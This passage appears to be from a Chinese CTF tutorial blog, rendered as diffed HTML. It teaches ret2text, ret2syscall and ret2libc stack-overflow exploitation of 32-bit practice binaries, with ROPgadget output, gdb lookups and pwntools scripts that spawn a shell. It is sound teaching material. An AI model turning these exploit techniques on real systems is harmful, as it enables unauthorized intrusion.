p32(ret_addr)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></p>
+<blockquote>
+<ol>
+<li><p>Shellcode生成器<br>使用shellcraft可以生成对应的架构的shellcode代码，直接使用链式调用的方法就可以得到<br>如32位linux：shellcraft.i386.linux.sh()<br>shellcode.ljust(offset,’a’)在shellcode后面填充offset - len(shellcode)长度的字符‘a’</p>
+</li>
+<li><p>汇编与反汇编<br>使用asm来进行汇编，使用disasm进行反汇编<br>指定cpu类型以及操作系统：asm(‘nop’, arch=’arm’，os = ‘linux’，endian = ‘little’，word_size = 32)</p>
+</li>
+</ol>
+</blockquote>
+<hr>
+<h1 id="0x02-ret2text"><a href="#0x02-ret2text" class="headerlink" title="0x02 ret2text"></a>0x02 ret2text</h1><h2 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h2><p>ret2text 即控制程序执行程序本身已有的的代码 (.text)。其实，这种攻击方法是一种笼统的描述。我们控制执行程序已有的代码的时候也可以控制程序执行好几段不相邻的程序已有的代码 (也就是 gadgets)，这就是我们所要说的 ROP。</p>
+<p>ROP不需要去执行栈中的shellcode，因此可以绕过DEP保护</p>
+<h2 id="检查保护"><a href="#检查保护" class="headerlink" title="检查保护"></a>检查保护</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$ checksec ret2text</span><br><span class="line">[*] &apos;/home/han/ck/pwn/linux/ret2text/ret2text&apos;</span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure>
+<p>开启了DEP，问题不大，因为执行的已有的代码</p>
+<h2 id="检查危险函数"><a href="#检查危险函数" class="headerlink" title="检查危险函数"></a>检查危险函数</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v4; <span class="comment">// [sp+1Ch] [bp-64h]@1</span></span><br><span class="line"></span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  setvbuf(_bss_start, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"There is something amazing here, do you know anything?"</span>);</span><br><span class="line">  gets((<span class="keyword">char</span> *)&amp;v4);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Maybe I will tell you next time !"</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>同样还是gets函数</p>
+<h2 id="计算偏移"><a href="#计算偏移" class="headerlink" title="计算偏移"></a>计算偏移</h2><p>和上一个一样，0x6c+4</p>
+<h2 id="寻找跳板"><a href="#寻找跳板" class="headerlink" title="寻找跳板"></a>寻找跳板</h2><p>在代码段发现调用 system(“/bin/sh”) 的代码，那么直接将ret覆盖为0804863A就能拿到shell<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">.text:0804862D                 call    ___isoc99_scanf</span><br><span class="line">.text:08048632                 mov     eax, [ebp+input]</span><br><span class="line">.text:08048635                 cmp     eax, [ebp+secretcode]</span><br><span class="line">.text:08048638                 jnz     short locret_8048646</span><br><span class="line">.text:0804863A                 mov     dword ptr [esp], offset command ; &quot;/bin/sh&quot;</span><br><span class="line">.text:08048641                 call    _system</span><br><span class="line">.text:08048646</span><br></pre></td></tr></table></figure></p>
+<h2 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">p = process(&apos;./ret2text&apos;)</span><br><span class="line">ret_add = 0x0804863A</span><br><span class="line">offset = 0x6c + 4</span><br><span class="line"></span><br><span class="line">payload = &apos;A&apos;*offset + p32(ret_add)</span><br><span class="line">print(p32(ret_add))</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<hr>
+<h1 id="0x03-ret2syscall"><a href="#0x03-ret2syscall" class="headerlink" title="0x03 ret2syscall"></a>0x03 ret2syscall</h1><h2 id="原理-2"><a href="#原理-2" class="headerlink" title="原理"></a>原理</h2><p>ret2syscall，即控制程序执行系统调用，获取 shell。上一个可以在代码段找到system(‘/bin/sh’),<br>如果没法找到的话，我们就得自己去构造系统调用<br>简单地说，只要我们把对应获取 shell 的系统调用的参数放到对应的寄存器中，那么我们在执行 int 0x80 就可执行对应的系统调用。比如说这里我们利用如下系统调用来获取 shell<br><code>execve(&quot;/bin/sh&quot;,NULL,NULL)</code><br>其中，该程序是 32 位，所以我们需要使得<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">系统调用号，即 eax 应该为 0xb</span><br><span class="line">第一个参数，即 ebx 应该指向 /bin/sh 的地址，其实执行 sh 的地址也可以。</span><br><span class="line">第二个参数，即 ecx 应该为 0</span><br><span class="line">第三个参数，即 edx 应该为 0</span><br></pre></td></tr></table></figure></p>
+<h2 id="获取跳板"><a href="#获取跳板" class="headerlink" title="获取跳板"></a>获取跳板</h2><p>那么我们如何去控制这4个寄存器的值，我们现在修改的只有栈中的数据，这里就需要使用 gadgets。比如说，现在栈顶是 10，那么如果此时执行了 pop eax，那么现在 eax 的值就为 10。但是我们并不能期待有一段连续的代码可以同时控制对应的寄存器，所以我们需要一段一段控制，这也是我们在 gadgets 最后使用 ret 来再次控制程序执行流程的原因。具体寻找 gadgets 的方法，我们可以使用 ropgadgets 这个工具。<br>首先，我们来寻找控制 eax 的 gadgets<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$ ROPgadget --binary ret2syscall --only &apos;pop|ret&apos;|grep eax</span><br><span class="line">0x0809ddda : pop eax ; pop ebx ; pop esi ; pop edi ; ret</span><br><span class="line">0x080bb196 : pop eax ; ret</span><br><span class="line">0x0807217a : pop eax ; ret 0x80e</span><br><span class="line">0x0804f704 : pop eax ; ret 3</span><br><span class="line">0x0809ddd9 : pop es ; pop eax ; pop ebx ; pop esi ; pop edi ; ret</span><br></pre></td></tr></table></figure></p>
+<p>类似的，我们可以得到控制其它寄存器的 gadgets<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">$ ROPgadget --binary ret2syscall --only &apos;pop|ret&apos;|grep ebx</span><br><span class="line">0x0809dde2 : pop ds ; pop ebx ; pop esi ; pop edi ; ret</span><br><span class="line">0x0809ddda : pop eax ; pop ebx ; pop esi ; pop edi ; ret</span><br><span class="line">0x0805b6ed : pop ebp ; pop ebx ; pop esi ; pop edi ; ret</span><br><span class="line">0x0809e1d4 : pop ebx ; pop ebp ; pop esi ; pop edi ; ret</span><br><span class="line">0x080be23f : pop ebx ; pop edi ; ret</span><br><span class="line">0x0806eb69 : pop ebx ; pop edx ; ret</span><br><span class="line">0x08092258 : pop ebx ; pop esi ; pop ebp ; ret</span><br><span class="line">0x0804838b : pop ebx ; pop esi ; pop edi ; pop ebp ; ret</span><br><span class="line">0x080a9a42 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret 0x10</span><br><span class="line">0x08096a26 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret 0x14</span><br><span class="line">0x08070d73 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret 0xc</span><br><span class="line">0x0805ae81 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret 4</span><br><span class="line">0x08049bfd : pop ebx ; pop esi ; pop edi ; pop ebp ; ret 8</span><br><span class="line">0x08048913 : pop ebx ; pop esi ; pop edi ; ret</span><br><span class="line">0x08049a19 : pop ebx ; pop esi ; pop edi ; ret 4</span><br><span class="line">0x08049a94 : pop ebx ; pop esi ; ret</span><br><span class="line">0x080481c9 : pop ebx ; ret</span><br><span class="line">0x080d7d3c : pop ebx ; ret 0x6f9</span><br><span class="line">0x08099c87 : pop ebx ; ret 8</span><br><span class="line">0x0806eb91 : pop ecx ; pop ebx ; ret</span><br><span class="line">0x0806336b : pop edi ; pop esi ; pop ebx ; ret</span><br><span class="line">0x0806eb90 : pop edx ; pop ecx ; pop ebx ; ret</span><br><span class="line">0x0809ddd9 : pop es ; pop eax ; pop ebx ; pop esi ; pop edi ; ret</span><br><span class="line">0x0806eb68 : pop esi ; pop ebx ; pop edx ; ret</span><br><span class="line">0x0805c820 : pop esi ; pop ebx ; ret</span><br><span class="line">0x08050256 : pop esp ; pop ebx ; pop esi ; pop edi ; pop ebp ; ret</span><br><span class="line">0x0807b6ed : pop ss ; pop ebx ; ret</span><br></pre></td></tr></table></figure></p>
+<p>现在，我们就得到了可以控制4个寄存器的地址：<br><code>0x080bb196 : pop eax ; ret</code><br><code>0x0806eb90 : pop edx ; pop ecx ; pop ebx ; ret</code></p>
+<p>另外，我们要向ebx写入’/bin/sh’，同时执行int 80<br>所以要搜索，看看程序中有没有<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$ ROPgadget --binary ret2syscall --only int</span><br><span class="line">Gadgets information</span><br><span class="line">============================================================</span><br><span class="line">0x08049421 : int 0x80</span><br><span class="line">0x080938fe : int 0xbb</span><br><span class="line">0x080869b5 : int 0xf6</span><br><span class="line">0x0807b4d4 : int 0xfc</span><br><span class="line"></span><br><span class="line">Unique gadgets found: 4</span><br></pre></td></tr></table></figure></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ ROPgadget --binary ret2syscall --string &apos;/bin/sh&apos;</span><br><span class="line">Strings information</span><br><span class="line">============================================================</span><br><span class="line">0x080be42c : /bin/sh</span><br></pre></td></tr></table></figure>
+<h2 id="测试-1"><a href="#测试-1" class="headerlink" title="测试"></a>测试</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">'./ret2syscall'</span>)</span><br><span class="line">offset = <span class="number">0x6c</span> + <span class="number">4</span></span><br><span class="line"></span><br><span class="line">pop_eax_ret = <span class="number">0x080bb196</span></span><br><span class="line">pop_edx_ecx_ebx_ret = <span class="number">0x0806eb90</span></span><br><span class="line">binsh = <span class="number">0x080be408</span></span><br><span class="line">int_0x80 = <span class="number">0x08049421</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">'A'</span>*offset + p32(pop_eax_ret) + p32(<span class="number">0xb</span>) + p32(pop_edx_ecx_ebx_ret) + p32(<span class="number">0</span>) + p32(<span class="number">0</span>) + p32(binsh) + p32(int_0x80)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload = flat(<span class="string">'A'</span>*offset , pop_eax_ret , <span class="number">0xb</span> , pop_edx_ecx_ebx_ret , <span class="number">0</span> , <span class="number">0</span> , binsh,int_0x80)</span><br><span class="line">print(payload)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<blockquote>
+<ol>
+<li>flat()<br>在pwntools中可以用flat()來构造rop，参数传递用list來传，list中的element为想串接的rop gadget地址，简单来说就是可以把：rop = p32(gadget1) + p32(gadget2) + p32(gadget3) ……变成这样表示：flat([gadget1,gadget2,gadget3,……])</li>
+</ol>
+</blockquote>
+<hr>
+<h1 id="0x04-ret2libc"><a href="#0x04-ret2libc" class="headerlink" title="0x04 ret2libc"></a>0x04 ret2libc</h1><h2 id="原理-3"><a href="#原理-3" class="headerlink" title="原理"></a>原理</h2><p>我们知道程序调用了libc.so，并且libc.so里保存了大量可利用的函数，我们如果可以让程序执行system(“/bin/sh”)的话，也可以获取到shell。既然思路有了，那么接下来的问题就是如何得到system()这个函数的地址以及”/bin/sh”这个字符串的地址，通常是返回至某个函数的 plt 处或者函数的具体位置 (即函数对应的 got 表项的内容)</p>
+<h2 id="1-程序中有system和’-bin-sh’"><a href="#1-程序中有system和’-bin-sh’" class="headerlink" title="1. 程序中有system和’/bin/sh’"></a>1. 程序中有system和’/bin/sh’</h2><h3 id="检查保护-1"><a href="#检查保护-1" class="headerlink" title="检查保护"></a>检查保护</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$ checksec ret2libc1</span><br><span class="line">[*] &apos;/home/han/ck/pwn/linux/ret2libc/ret2libc1&apos;</span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure>
+<h3 id="确定漏洞位置"><a href="#确定漏洞位置" class="headerlink" title="确定漏洞位置"></a>确定漏洞位置</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v4; <span class="comment">// [sp+1Ch] [bp-64h]@1</span></span><br><span class="line"></span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  setvbuf(_bss_start, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"RET2LIBC &gt;_&lt;"</span>);</span><br><span class="line">  gets((<span class="keyword">char</span> *)&amp;v4);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h3 id="计算偏移-1"><a href="#计算偏移-1" class="headerlink" title="计算偏移"></a>计算偏移</h3><h3 id="寻找跳板-1"><a href="#寻找跳板-1" class="headerlink" title="寻找跳板"></a>寻找跳板</h3><ol>
+<li><p>system_plt</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">.plt:08048460 _system         proc near               ; CODE XREF: secure+44p</span><br><span class="line">.plt:08048460                 jmp     ds:off_804A018</span><br><span class="line">.plt:08048460 _system         endp</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>‘binsh’</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ ROPgadget --binary ret2libc1 --string &apos;/bin/sh&apos;</span><br><span class="line">Strings information</span><br><span class="line">============================================================</span><br><span class="line">0x08048744 : /bin/sh</span><br></pre></td></tr></table></figure>
+</li>
+</ol>
+<h3 id="pwn测试-2"><a href="#pwn测试-2" class="headerlink" title="pwn测试"></a>pwn测试</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">'./ret2libc1'</span>)</span><br><span class="line"></span><br><span class="line">offset =<span class="number">112</span></span><br><span class="line">binsh = <span class="number">0x08048720</span></span><br><span class="line">system_plt = <span class="number">0x08048460</span></span><br><span class="line">fake_ret = <span class="string">'bbbb'</span></span><br><span class="line"></span><br><span class="line">payload = flat([<span class="string">'a'</span>*offset,system_plt,fake_ret,binsh])</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<p>fake_ret是调用system之后的返回地址，binsh就是system的参数</p>
+<h2 id="2-没有binsh"><a href="#2-没有binsh" class="headerlink" title="2. 没有binsh"></a>2. 没有binsh</h2><p>需要我们自己来读取字符串，所以我们需要两个 gadgets，第一个控制程序读取字符串，使用gets将’/bin/sh’写入程序某个位置，第二个控制程序执行 system(“/bin/sh”)。</p>
+<p>我们在.bss段发现了未利用的buf2，可以把binsh写入buf2<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">.bss:0804A080                 public buf2</span><br><span class="line">.bss:0804A080 ; char buf2[100]</span><br><span class="line">.bss:0804A080 buf2            db 64h dup(?)</span><br><span class="line">.bss:0804A080 _bss            ends</span><br></pre></td></tr></table></figure></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">p = process(&apos;./ret2libc2&apos;)</span><br><span class="line"></span><br><span class="line">gets_plt = 0x08048460</span><br><span class="line">pop_ebx = 0x0804843d</span><br><span class="line">system_plt = 0x08048490</span><br><span class="line">buf2_add = 0x804a080</span><br><span class="line"></span><br><span class="line">payload = flat([&apos;a&apos;*112,gets_plt,pop_ebx,buf2_add,system_plt,0xdeadbeef,buf2_add])</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.sendline(&apos;/bin/sh&apos;)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<p>buf2_add是gets的参数，pop_ebx将gets返回后的堆栈平衡，移交控制权给system</p>
+<h2 id="3-两个都没有-amp-无ASLR"><a href="#3-两个都没有-amp-无ASLR" class="headerlink" title="3. 两个都没有&amp;无ASLR"></a>3. 两个都没有&amp;无ASLR</h2><p>程序中两个都没有，但是我们可以利用libc中的system和’/bin/sh’<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$ checksec ret2libc3</span><br><span class="line">[*] &apos;/home/han/ck/pwn/linux/ret2libc/ret2libc3&apos;</span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure></p>
+<h3 id="寻找跳板-2"><a href="#寻找跳板-2" class="headerlink" title="寻找跳板"></a>寻找跳板</h3><p>这时候我们可以使用gdb进行调试。然后通过print和find命令来查找system和”/bin/sh”字符串的地址。<br>我们首先在main函数上下一个断点，然后执行程序，这样的话程序会加载libc.so到内存中，然后我们就可以通过”print system”这个命令来获取system函数在内存中的位置，随后我们可以通过” print __libc_start_main”这个命令来获取libc.so在内存中的起始位置，接下来我们可以通过find命令来查找”/bin/sh”这个字符串。这样我们就得到了system的地址0xf7e19d10以及”/bin/sh”的地址0xf7f588cf。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">Breakpoint 1, main () at ret2libcGOT.c:20</span><br><span class="line">20	ret2libcGOT.c: No such file or directory.</span><br><span class="line">gdb-peda$ print system</span><br><span class="line">$1 = &#123;&lt;text variable, no debug info&gt;&#125; 0xf7e19d10 &lt;system&gt;</span><br><span class="line">gdb-peda$ print __libc_start_main</span><br><span class="line">$2 = &#123;&lt;text variable, no debug info&gt;&#125; 0xf7df5d90 &lt;__libc_start_main&gt;</span><br><span class="line">gdb-peda$ find 0xf7df5d90,+2200000,&quot;/bin/sh&quot;</span><br><span class="line">Searching for &apos;0xf7df5d90,+2200000,/bin/sh&apos; in: None ranges</span><br><span class="line">Search for a pattern in memory; support regex search</span><br><span class="line">Usage:</span><br><span class="line">    searchmem pattern start end</span><br><span class="line">    searchmem pattern mapname</span><br><span class="line"></span><br><span class="line">gdb-peda$ find &quot;/bin/sh&quot;</span><br><span class="line">Searching for &apos;/bin/sh&apos; in: None ranges</span><br><span class="line">Found 1 results, display max 1 items:</span><br><span class="line">libc : 0xf7f588cf (&quot;/bin/sh&quot;)</span><br></pre></td></tr></table></figure></p>
+<h3 id="测试-2"><a href="#测试-2" class="headerlink" title="测试"></a>测试</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">p = process(&apos;./ret2libc3&apos;)</span><br><span class="line"></span><br><span class="line">offset = 112</span><br><span class="line">system_addr = 0xf7e19d10</span><br><span class="line">binsh = 0xf7f588cf</span><br><span class="line"></span><br><span class="line">payload = flat([&apos;a&apos;*112,system_addr,0xdeabeef,binsh])</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<hr>
+<h2 id="4-两个都没有-amp-有ASLR"><a href="#4-两个都没有-amp-有ASLR" class="headerlink" title="4. 两个都没有&amp;有ASLR"></a>4. 两个都没有&amp;有ASLR</h2><p>通过<code>sudo cat /proc/[pid]/maps</code>或者<code>ldd</code>查看，你会发现libc.so地址每次都是变化的<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">$ ldd ret2libc3</span><br><span class="line">	linux-gate.so.1 (0xf7f43000)</span><br><span class="line">	libc.so.6 =&gt; /lib32/libc.so.6 (0xf7d4c000)</span><br><span class="line">	/lib/ld-linux.so.2 (0xf7f45000)</span><br><span class="line"></span><br><span class="line">han at ubuntu in ~/ck/pwn/linux/ret2libc</span><br><span class="line">$ ldd ret2libc3</span><br><span class="line">	linux-gate.so.1 (0xf7f96000)</span><br><span class="line">	libc.so.6 =&gt; /lib32/libc.so.6 (0xf7d9f000)</span><br><span class="line">	/lib/ld-linux.so.2 (0xf7f98000)</span><br></pre></td></tr></table></figure></p>
+<p>那么如何解决地址随机化的问题呢？思路是：我们需要先泄漏出libc.so某些函数在内存中的地址，然后再利用泄漏出的函数地址根据偏移量计算出system()函数和/bin/sh字符串在内存中的地址，然后再执行我们的ret2libc的shellcode。既然栈，libc，heap的地址都是随机的。我们怎么才能泄露出libc.so的地址呢？方法还是有的，因为程序本身在内存中的地址并不是随机的，如图所示：</p>
+<p><img src="https://res.cloudinary.com/dozyfkbg3/image/upload/v1563267241/pwn/4a7227aa9f00bd2fd45d363da4cf25c6fd425638.jpg" alt><br>也就是说程序内存映像是没有随机的</p>
+<p>首先我们利用<code>objdump</code>来查看可以利用的plt函数和函数对应的got表：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><span class="line">$ objdump  -d -j  .plt ./ret2libc3</span><br><span class="line"></span><br><span class="line">./ret2libc3:     file format elf32-i386</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Disassembly of section .plt:</span><br><span class="line"></span><br><span class="line">08048420 &lt;.plt&gt;:</span><br><span class="line"> 8048420:	ff 35 04 a0 04 08    	pushl  0x804a004</span><br><span class="line"> 8048426:	ff 25 08 a0 04 08    	jmp    *0x804a008</span><br><span class="line"> 804842c:	00 00                	add    %al,(%eax)</span><br><span class="line">	...</span><br><span class="line"></span><br><span class="line">08048430 &lt;printf@plt&gt;:</span><br><span class="line"> 8048430:	ff 25 0c a0 04 